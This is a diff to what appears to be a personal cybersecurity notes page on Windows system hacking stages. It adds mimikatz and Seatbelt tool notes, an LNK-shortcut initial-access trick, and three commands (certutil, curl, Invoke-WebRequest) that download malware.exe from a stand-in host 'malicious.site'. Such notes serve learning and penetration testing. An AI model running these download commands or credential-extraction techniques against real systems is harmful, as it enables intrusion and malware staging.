@@ -1,7 +1,8 @@
 # Systems hacking stages (windows)
 
 ### 🛠️ Tools
-- [mimikatz](https://github.com/gentilkiwi/mimikatz)
+- [mimikatz](https://github.com/gentilkiwi/mimikatz) – extract passwords
+- [SeatBelt](https://github.com/GhostPack/Seatbelt) – discovery automation
 
 ## Information gathering
 
@@ -13,7 +14,9 @@ $ nmap -A -T4 <TARGET_IP>
 $ nmap -sS -A -T4 -O <TARGET_IP>
 ```
 
----
+## Initial access methods
+
+- LNK shortcut with custom icon where the target value is a script
 
 ## Exploitation
 
@@ -168,10 +171,21 @@ Enumeration tools:
 - WebBrowserPassView
     - https://www.nirsoft.net/utils/web_browser_password.html
 
----
-
 ### Privilege escalation
 
 See <a href="https://github.com/e2f5db0/cybersec-notes/systems/windows/privilege-escalation.md">windows/privilege-escalation.md</a>
 
 ---
+
+### Dropping files
+
+Files can be dropped in RDP copy-paste or download via web browser.
+
+CLI:
+```powershell
+certutil.exe -urlcache -f https://malicious.site/file.exe -o malware.exe
+
+curl.exe https://malicious.site/file.exe -o malware.exe
+
+Invoke-WebRequest -Uri 'https://malicious.site/file.exe' -OutFile 'malware.exe'
+```
